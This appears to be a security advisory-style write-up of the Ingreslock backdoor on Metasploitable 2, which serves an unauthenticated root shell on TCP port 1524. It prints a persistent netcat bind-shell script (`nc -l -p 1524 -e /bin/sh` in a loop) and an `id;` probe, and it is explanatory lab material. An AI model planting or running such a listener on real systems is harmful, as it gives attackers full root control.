# Ingreslock Backdoor Service (Port 1524)

## Threat Details

**Severity:** Critical
**CVSS Score:** 10.0
**CVE:** N/A (deliberate backdoor)

## Description

The "Ingreslock" backdoor is a malicious root shell bound to TCP port 1524. This is one of the most notorious backdoors found on the original Metasploitable 2 vulnerable VM. When an attacker connects to port 1524, they receive an unauthenticated root shell with full system access.

The backdoor responds to the command `id;` with `uid=0(root) gid=0(root)`, immediately revealing root-level compromise.

## Affected Service

- **Service:** Backdoor root shell (netcat listener)
- **Port:** 1524/tcp
- **Process:** Usually netcat or similar bound to `/bin/sh` as root

## Vulnerable Configuration

A malicious script or process runs on boot:

```bash
/opt/ingreslock_backdoor.sh:
#!/bin/bash
while true; do
  nc -l -p 1524 -e /bin/sh
  sleep 1
done
```

This creates a persistent backdoor that automatically restarts if the connection is closed.

## Impact

An attacker who discovers this backdoor can:
- Obtain immediate **unauthenticated root shell access**
- Execute arbitrary commands as the root user
- Read, modify, or delete any file on the system
- Install additional malware or persistence mechanisms
- Pivot to other systems on the network
- Exfiltrate sensitive data
- Completely compromise system integrity, confidentiality, and availability

This represents **total system compromise** and is the highest severity vulnerability possible.
